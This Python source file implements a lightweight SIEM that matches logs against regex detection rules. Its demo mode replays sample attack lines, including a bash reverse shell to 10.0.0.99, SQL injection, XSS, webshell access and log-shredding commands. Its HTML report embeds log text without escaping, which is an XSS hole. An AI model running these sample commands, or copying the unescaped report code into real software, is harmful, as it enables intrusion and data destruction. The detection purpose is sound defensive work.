#!/usr/bin/env python3
"""
ThreatHunter-SIEM - Lightweight SIEM & Threat Detection Engine
Author: Srinivasan S (SRINIVASAN55)
Ingests logs, applies detection rules, raises alerts, and generates dashboards.
"""

import re
import os
import sys
import json
import time
import argparse
import threading
from datetime import datetime
from pathlib import Path
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Pattern

# ─── Colors ────────────────────────────────────────────────────────────────────
class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"
    CYAN="\033[96m"; BLUE="\033[94m"; BOLD="\033[1m"; RESET="\033[0m"

BANNER = f"""{C.BLUE}{C.BOLD}
  ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
  ╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
     ██║   ███████║██████╔╝█████╗  ███████║   ██║   ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
     ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
     ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║   ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                  S I E M  |  Threat Detection Engine v1.0
{C.RESET}"""

# ─── Data Models ────────────────────────────────────────────────────────────────
@dataclass
class LogEvent:
    raw:       str
    timestamp: str = ""
    source:    str = ""
    level:     str = ""
    message:   str = ""
    fields:    Dict = field(default_factory=dict)

@dataclass
class DetectionRule:
    rule_id:   str
    name:      str
    severity:  str
    pattern:   str
    category:  str
    description: str
    remediation: str = ""
    mitre_id:  str = ""
    compiled:  Optional[Pattern] = field(default=None, repr=False)

    def __post_init__(self):
        try:
            self.compiled = re.compile(self.pattern, re.IGNORECASE | re.MULTILINE)
        except Exception:
            self.compiled = None

@dataclass
class Alert:
    rule_id:   str
    rule_name: str
    severity:  str
    timestamp: str
    log_line:  str
    source:    str = ""
    category:  str = ""
    mitre_id:  str = ""

# ─── Built-in Detection Rules ─────────────────────────────────────────────────
BUILTIN_RULES = [
    # Authentication
    DetectionRule("AUTH-001","Brute Force Login","HIGH",
        r"(failed password|authentication failure|invalid password|login failed).{0,100}",
        "Authentication","Multiple failed login attempts detected.",
        "Block source IP, enable MFA, audit account lockout policy.","T1110"),
    DetectionRule("AUTH-002","Successful Sudo/Root","HIGH",
        r"sudo:.{0,30}(COMMAND|session opened for user root)",
        "Privilege Escalation","Root/sudo command execution detected.",
        "Audit sudo logs, verify legitimacy of root access.","T1548"),
    DetectionRule("AUTH-003","SSH Key Auth Failure","MEDIUM",
        r"(invalid publickey|key_verify FAILED|publickey authentication failed)",
        "Authentication","SSH public key authentication failure.",
        "Verify authorized_keys, check for unauthorized key additions.","T1110.004"),
    DetectionRule("AUTH-004","New User Created","HIGH",
        r"(useradd|adduser|New user).{0,80}",
        "Account Management","A new user account was created.",
        "Verify legitimacy. Unauthorized accounts may indicate compromise.","T1136"),
    DetectionRule("AUTH-005","Password Changed","MEDIUM",
        r"(passwd|chpasswd|password changed|CHANGE PASSWORD)",
        "Account Management","A user password was changed.",
        "Verify the change was authorized.","T1531"),
    # Network
    DetectionRule("NET-001","Reverse Shell Patterns","CRITICAL",
        r"(bash -i|nc -e|ncat --sh-exec|/dev/tcp/|python.*socket.*connect|perl.*exec|socat.*exec)",
        "Reverse Shell","Potential reverse shell command detected.",
        "Isolate host immediately, investigate process tree.","T1059"),
    DetectionRule("NET-002","Port Scan Detected","HIGH",
        r"(nmap|masscan|portscan|port.scan|syn.scan|connect.scan)",
        "Reconnaissance","Port scanning tool usage detected.",
        "Block source, review firewall rules.","T1046"),
    DetectionRule("NET-003","DNS Tunneling Indicators","HIGH",
        r"(iodine|dnscat|dns.tunnel|dns.exfil|long DNS query)",
        "Exfiltration","Potential DNS tunneling/exfiltration detected.",
        "Block suspicious DNS, inspect DNS query lengths.","T1071.004"),
    # Malware / Execution
    DetectionRule("MAL-001","Webshell Access","CRITICAL",
        r"(c99\.php|r57\.php|WSO\.php|phpspy|web.?shell|cmd\.php|eval\(base64)",
        "Webshell","Web shell access or upload detected.",
        "Remove webshell, scan server, rotate credentials.","T1505.003"),
    DetectionRule("MAL-002","Base64 Encoded Payload","HIGH",
        r"(base64.*decode|echo.*|.*base64|frombase64string)",
        "Obfuscation","Base64-encoded payload execution detected.",
        "Decode and analyze payload, check for fileless malware.","T1027"),
    DetectionRule("MAL-003","Cron Job Modification","HIGH",
        r"(crontab|/etc/cron|cron.d|at.allow|CRON)",
        "Persistence","Cron job modification — possible persistence mechanism.",
        "Review all crontabs, remove unauthorized entries.","T1053"),
    DetectionRule("MAL-004","Suspicious Download","HIGH",
        r"(curl|wget|certutil|powershell.*download|invoke-webrequest).{0,80}(http|ftp)",
        "Download","Suspicious file download via shell command.",
        "Inspect downloaded files, check destination URLs.","T1105"),
    # SQL Injection
    DetectionRule("WEB-001","SQL Injection Attempt","CRITICAL",
        r"(select.{0,30}from|union.{0,30}select|insert.{0,30}into|drop.{0,30}table|' or '|1=1|--\s*$|\/\*.*\*\/)",
        "Web Attack","SQL injection attempt in web logs.",
        "WAF rule, parameterized queries, input validation.","T1190"),
    DetectionRule("WEB-002","XSS Attempt","HIGH",
        r"(<script|javascript:|onerror=|onload=|alert\(|document\.cookie|<img src=x)",
        "Web Attack","Cross-site scripting (XSS) attempt detected.",
        "Output encoding, Content-Security-Policy header.","T1059.007"),
    DetectionRule("WEB-003","Path Traversal","HIGH",
        r"(\.\./|\.\.\\|%2e%2e|%252e%252e|/etc/passwd|/windows/system32)",
        "Web Attack","Directory traversal attack detected.",
        "Input validation, chroot jail, disable directory listing.","T1083"),
    DetectionRule("WEB-004","Scanner Detected","MEDIUM",
        r"(sqlmap|nikto|nessus|openvas|burpsuite|acunetix|dirbuster|gobuster)",
        "Reconnaissance","Security scanner detected in logs.",
        "Block scanner UA/IP, review exposed endpoints.","T1595"),
    # System
    DetectionRule("SYS-001","File Permission Change","MEDIUM",
        r"(chmod.{0,20}(777|4755|suid)|chown root|setuid|setgid)",
        "System","Suspicious file permission change.",
        "Review changed files, check for SUID abuse.","T1548.001"),
    DetectionRule("SYS-002","Firewall Disabled","CRITICAL",
        r"(iptables -F|ufw disable|firewall.*stopped|netsh.*firewall.*disabled)",
        "Defense Evasion","Firewall disabled or flushed.",
        "Re-enable firewall, investigate why it was disabled.","T1562.004"),
    DetectionRule("SYS-003","Log Clearing","CRITICAL",
        r"(shred.*log|rm.*\.log|clear-eventlog|wevtutil.*cl|echo.*>/var/log)",
        "Defense Evasion","Log clearing/deletion detected.",
        "Restore logs from backup, investigate root cause.","T1070"),
]

# ─── Log Parsers ─────────────────────────────────────────────────────────────
class LogParser:
    SYSLOG_RE = re.compile(
        r"(?P<month>\w+)\s+(?P<day>\d+)\s+(?P<time>\S+)\s+(?P<host>\S+)\s+"
        r"(?P<process>\S+?)(?:\[(?P<pid>\d+)\])?:\s*(?P<message>.*)"
    )
    APACHE_RE = re.compile(
        r'(?P<ip>\S+)\s+\S+\s+\S+\s+\[(?P<time>[^\]]+)\]\s+'
        r'"(?P<method>\w+)\s+(?P<path>\S+)\s+\S+"\s+(?P<status>\d+)\s+(?P<size>\S+)'
        r'(?:\s+"(?P<referer>[^"]*)"\s+"(?P<ua>[^"]*)")?'
    )
    JSON_RE = re.compile(r'^\s*\{.*\}\s*$')

    @classmethod
    def parse(cls, raw: str, source: str = "unknown") -> LogEvent:
        ev = LogEvent(raw=raw.strip(), source=source)
        # Try JSON
        if cls.JSON_RE.match(raw):
            try:
                d = json.loads(raw)
                ev.timestamp = d.get("timestamp", d.get("time", d.get("@timestamp", "")))
                ev.level     = d.get("level", d.get("severity", "INFO")).upper()
                ev.message   = d.get("message", d.get("msg", raw))
                ev.fields    = d
                return ev
            except Exception:
                pass
        # Try syslog
        m = cls.SYSLOG_RE.match(raw)
        if m:
            ev.timestamp = f"{m.group('month')} {m.group('day')} {m.group('time')}"
            ev.source    = m.group("host")
            ev.message   = m.group("message")
            if any(w in ev.message.lower() for w in ["error","fail","deny","alert","critical"]):
                ev.level = "ERROR"
            else:
                ev.level = "INFO"
            return ev
        # Try Apache
        m = cls.APACHE_RE.match(raw)
        if m:
            ev.timestamp = m.group("time")
            ev.source    = m.group("ip")
            ev.message   = raw
            ev.level     = "ERROR" if int(m.group("status") or 0) >= 400 else "INFO"
            ev.fields    = {"method": m.group("method"), "path": m.group("path"),
                            "status": m.group("status"), "ip": m.group("ip")}
            return ev
        # Fallback
        ev.message = raw
        ev.level = "INFO"
        return ev

# ─── SIEM Engine ─────────────────────────────────────────────────────────────
class ThreatHunterSIEM:
    def __init__(self, rules: List[DetectionRule] = None, output_dir: str = "."):
        self.rules     = rules or BUILTIN_RULES
        self.output_dir = output_dir
        self.alerts: List[Alert] = []
        self.events: List[LogEvent] = []
        self.stats     = defaultdict(int)
        self._lock     = threading.Lock()

    def _log(self, msg, color=""):
        print(f"{color}{msg}{C.RESET}", flush=True)

    # ── Rule Matching ───────────────────────────────────────────────────────
    def match_rules(self, event: LogEvent) -> List[Alert]:
        matched = []
        text = f"{event.message} {event.raw}"
        for rule in self.rules:
            if rule.compiled and rule.compiled.search(text):
                alert = Alert(
                    rule_id=rule.rule_id, rule_name=rule.name,
                    severity=rule.severity,
                    timestamp=event.timestamp or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    log_line=event.raw[:200],
                    source=event.source, category=rule.category,
                    mitre_id=rule.mitre_id
                )
                matched.append(alert)
                self.stats[rule.severity] += 1
        return matched

    def process_event(self, raw: str, source: str = "file") -> List[Alert]:
        if not raw.strip():
            return []
        event = LogParser.parse(raw, source)
        self.events.append(event)
        alerts = self.match_rules(event)
        with self._lock:
            self.alerts.extend(alerts)
        return alerts

    # ── File Ingestion ───────────────────────────────────────────────────────
    def ingest_file(self, path: str):
        p = Path(path)
        if not p.exists():
            self._log(f"[!] File not found: {path}", C.RED)
            return
        self._log(f"\n[+] Ingesting: {path}", C.GREEN)
        total = 0; hit = 0
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                total += 1
                alerts = self.process_event(line, source=p.name)
                if alerts:
                    hit += 1
                    for a in alerts:
                        self._print_alert(a)
        self._log(f"    Lines: {total:,} | Alerts: {hit:,}", C.CYAN)

    # ── Live Tail ────────────────────────────────────────────────────────────
    def tail_file(self, path: str):
        self._log(f"\n[+] Live tailing: {path} (Ctrl+C to stop)", C.GREEN)
        with open(path, encoding="utf-8", errors="ignore") as f:
            f.seek(0, 2)  # go to end
            while True:
                line = f.readline()
                if line:
                    alerts = self.process_event(line, source=path)
                    for a in alerts:
                        self._print_alert(a)
                else:
                    time.sleep(0.1)

    # ── Demo Mode ────────────────────────────────────────────────────────────
    def demo_mode(self):
        self._log("\n[*] Running DEMO MODE — replaying attack scenario logs...\n", C.YELLOW)
        demo_logs = [
            # Normal traffic
            "Jan 15 10:23:01 webserver sshd[1234]: Accepted publickey for admin from 192.168.1.5 port 22",
            "Jan 15 10:23:02 webserver nginx: 192.168.1.100 - GET /index.html 200",
            # Brute force
            "Jan 15 10:25:01 webserver sshd[1234]: Failed password for root from 10.0.0.99 port 54321 ssh2",
            "Jan 15 10:25:02 webserver sshd[1234]: Failed password for root from 10.0.0.99 port 54322 ssh2",
            "Jan 15 10:25:03 webserver sshd[1234]: Failed password for admin from 10.0.0.99 port 54323 ssh2",
            "Jan 15 10:25:04 webserver sshd[1234]: authentication failure; user=root rhost=10.0.0.99",
            # SQLi
            '192.168.1.50 - - [15/Jan/2024:10:26:00] "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 1024',
            '192.168.1.50 - - [15/Jan/2024:10:26:01] "GET /login?user=admin\'&pass=x HTTP/1.1" 500 50',
            # XSS
            '10.0.0.5 - - [15/Jan/2024:10:27:00] "GET /comment?text=<script>alert(1)</script> HTTP/1.1" 200 512',
            # Webshell
            '10.0.0.5 - - [15/Jan/2024:10:28:00] "GET /uploads/c99.php?cmd=id HTTP/1.1" 200 128',
            # Reverse shell
            "Jan 15 10:29:00 webserver bash: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
            # Privilege escalation
            "Jan 15 10:30:00 webserver sudo: www-data : COMMAND=/bin/bash",
            "Jan 15 10:30:01 webserver su: session opened for user root by www-data",
            # Persistence
            "Jan 15 10:31:00 webserver crontab[999]: www-data edited crontab",
            "Jan 15 10:31:01 webserver CRON[1001]: * * * * * /tmp/.hidden/payload.sh",
            # Firewall disabled
            "Jan 15 10:32:00 webserver kernel: iptables -F — all rules flushed",
            # Log clearing
            "Jan 15 10:33:00 webserver bash: rm /var/log/auth.log",
            "Jan 15 10:33:01 webserver bash: shred -u /var/log/syslog",
            # Scanner
            '192.168.1.200 - - [15/Jan/2024:10:34:00] "GET / HTTP/1.1" 200 1024 "" "sqlmap/1.7"',
            # Path traversal
            '192.168.1.50 - - [15/Jan/2024:10:35:00] "GET /../../../../etc/passwd HTTP/1.1" 200 2000',
            # Normal traffic again
            "Jan 15 10:36:00 webserver sshd[1234]: Accepted publickey for deploy from 10.10.10.1",
        ]
        for line in demo_logs:
            alerts = self.process_event(line, source="demo")
            if not alerts:
                ts = datetime.now().strftime("%H:%M:%S")
                self._log(f"  {C.CYAN}{ts}{C.RESET} [INFO ] {line[:90]}")
            for a in alerts:
                self._print_alert(a)
            time.sleep(0.3)

    def _print_alert(self, a: Alert):
        color = {"CRITICAL":C.RED+C.BOLD,"HIGH":C.RED,"MEDIUM":C.YELLOW,"LOW":C.GREEN}.get(a.severity,C.CYAN)
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  {color}{'█'*3} [{a.severity}] [{ts}] {a.rule_name} [{a.rule_id}]{C.RESET}")
        print(f"      Category : {a.category}")
        print(f"      MITRE    : {a.mitre_id or 'N/A'}")
        print(f"      Source   : {a.source or 'unknown'}")
        print(f"      Log      : {a.log_line[:120]}")
        # Find remediation
        for rule in self.rules:
            if rule.rule_id == a.rule_id and rule.remediation:
                print(f"      Fix      : {rule.remediation}")
                break

    # ── Reports ───────────────────────────────────────────────────────────────
    def save_json_report(self):
        fname = os.path.join(self.output_dir, f"threathunter_report_{int(time.time())}.json")
        report = {
            "generated": datetime.now().isoformat(),
            "total_events": len(self.events),
            "total_alerts": len(self.alerts),
            "severity_summary": dict(self.stats),
            "alerts": [
                {"rule_id":a.rule_id,"rule_name":a.rule_name,"severity":a.severity,
                 "timestamp":a.timestamp,"category":a.category,"mitre":a.mitre_id,
                 "source":a.source,"log":a.log_line}
                for a in self.alerts
            ]
        }
        with open(fname, "w") as f:
            json.dump(report, f, indent=2)
        return fname

    def save_html_report(self):
        fname = os.path.join(self.output_dir, f"threathunter_dashboard_{int(time.time())}.html")
        sev_counts = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0}
        for a in self.alerts:
            if a.severity in sev_counts:
                sev_counts[a.severity] += 1
        cats = defaultdict(int)
        for a in self.alerts:
            cats[a.category] += 1
        alert_rows = ""
        sev_colors = {"CRITICAL":"#dc2626","HIGH":"#ea580c","MEDIUM":"#ca8a04","LOW":"#16a34a"}
        for a in self.alerts[-50:]:
            col = sev_colors.get(a.severity,"#888")
            alert_rows += f"""<tr>
              <td><span style="background:{col};color:#fff;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold">{a.severity}</span></td>
              <td>{a.rule_id}</td>
              <td><strong>{a.rule_name}</strong></td>
              <td>{a.category}</td>
              <td>{a.mitre_id or "—"}</td>
              <td>{a.source or "—"}</td>
              <td style="font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis">{a.log_line[:80]}...</td>
            </tr>"""
        cat_rows = "".join(f'<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #21262d"><span>{k}</span><strong>{v}</strong></div>' for k,v in sorted(cats.items(),key=lambda x:-x[1]))
        html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>ThreatHunter-SIEM Dashboard</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#e6edf3;min-height:100vh}}
header{{background:#161b22;border-bottom:2px solid #1f6feb;padding:20px 32px;display:flex;align-items:center;gap:16px}}
header h1{{color:#1f6feb;font-size:24px}}
header span{{color:#8b949e;font-size:14px}}
.grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;padding:24px 32px}}
.card{{background:#161b22;border-radius:10px;padding:20px;text-align:center}}
.card .num{{font-size:40px;font-weight:bold;margin:8px 0}}
.card .label{{color:#8b949e;font-size:12px;text-transform:uppercase;letter-spacing:1px}}
.section{{padding:0 32px 32px}}
.section h2{{color:#1f6feb;font-size:18px;margin-bottom:16px;border-bottom:1px solid #21262d;padding-bottom:8px}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th{{background:#21262d;padding:10px 14px;text-align:left;color:#8b949e;font-weight:600;font-size:11px;text-transform:uppercase}}
td{{padding:10px 14px;border-bottom:1px solid #161b22;vertical-align:top}}
tr:hover td{{background:#161b22}}
.cats{{background:#161b22;border-radius:10px;padding:20px;margin-bottom:24px}}
</style></head>
<body>
<header><div>🎯</div><div><h1>ThreatHunter-SIEM Dashboard</h1><span>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Events: {len(self.events):,} | Alerts: {len(self.alerts)}</span></div></header>
<div class="grid">
  <div class="card"><div class="num" style="color:#dc2626">{sev_counts['CRITICAL']}</div><div class="label">Critical</div></div>
  <div class="card"><div class="num" style="color:#ea580c">{sev_counts['HIGH']}</div><div class="label">High</div></div>
  <div class="card"><div class="num" style="color:#ca8a04">{sev_counts['MEDIUM']}</div><div class="label">Medium</div></div>
  <div class="card"><div class="num" style="color:#16a34a">{sev_counts['LOW']}</div><div class="label">Low</div></div>
</div>
<div class="section">
  <div style="display:grid;grid-template-columns:1fr 3fr;gap:16px">
    <div><h2>Categories</h2><div class="cats">{cat_rows}</div></div>
    <div><h2>Alert Details (Latest 50)</h2>
    <table><thead><tr><th>Severity</th><th>Rule ID</th><th>Rule Name</th><th>Category</th><th>MITRE</th><th>Source</th><th>Log Preview</th></tr></thead>
    <tbody>{alert_rows}</tbody></table></div>
  </div>
</div>
</body></html>"""
        with open(fname, "w") as f:
            f.write(html)
        return fname

    def print_summary(self):
        print(f"\n{C.BOLD}{'═'*60}{C.RESET}")
        print(f"{C.BOLD}  THREATHUNTER-SIEM SUMMARY{C.RESET}")
        print(f"{'═'*60}")
        print(f"  Events Processed : {len(self.events):,}")
        print(f"  Rules Applied    : {len(self.rules)}")
        print(f"  Total Alerts     : {len(self.alerts)}")
        print(f"\n  {'CRITICAL':<12}: {self.stats.get('CRITICAL',0)}")
        print(f"  {'HIGH':<12}: {self.stats.get('HIGH',0)}")
        print(f"  {'MEDIUM':<12}: {self.stats.get('MEDIUM',0)}")
        print(f"  {'LOW':<12}: {self.stats.get('LOW',0)}")
        print(f"{C.BOLD}{'═'*60}{C.RESET}\n")

# ─── CLI ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="ThreatHunter-SIEM — Lightweight SIEM & Threat Detection Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python threathunter.py --demo                           # Demo mode with attack scenario
  python threathunter.py -f /var/log/auth.log             # Analyze auth log
  python threathunter.py -f /var/log/nginx/access.log     # Analyze web server log
  python threathunter.py -f auth.log -f access.log        # Multiple log files
  python threathunter.py -f /var/log/syslog --tail        # Live tail mode
        """
    )
    parser.add_argument("-f","--file",   action="append", help="Log file(s) to analyze")
    parser.add_argument("--tail",        action="store_true", help="Live tail the last -f file")
    parser.add_argument("--demo",        action="store_true", help="Run built-in attack scenario demo")
    parser.add_argument("-o","--output", default=".", help="Output directory for reports")
    parser.add_argument("--rules",       help="Custom rules JSON file path")
    args = parser.parse_args()

    print(BANNER)
    siem = ThreatHunterSIEM(output_dir=args.output)

    if args.demo:
        siem.demo_mode()
    elif args.file:
        for f in args.file:
            siem.ingest_file(f)
        if args.tail and args.file:
            try:
                siem.tail_file(args.file[-1])
            except KeyboardInterrupt:
                pass
    else:
        parser.print_help()
        print(f"\n{C.YELLOW}[*] Tip: Run with --demo to see a live attack scenario!{C.RESET}\n")
        return

    siem.print_summary()
    json_report = siem.save_json_report()
    html_report = siem.save_html_report()
    print(f"{C.GREEN}[✓] JSON report : {json_report}{C.RESET}")
    print(f"{C.GREEN}[✓] HTML dashboard: {html_report}{C.RESET}")

if __name__ == "__main__":
    main()
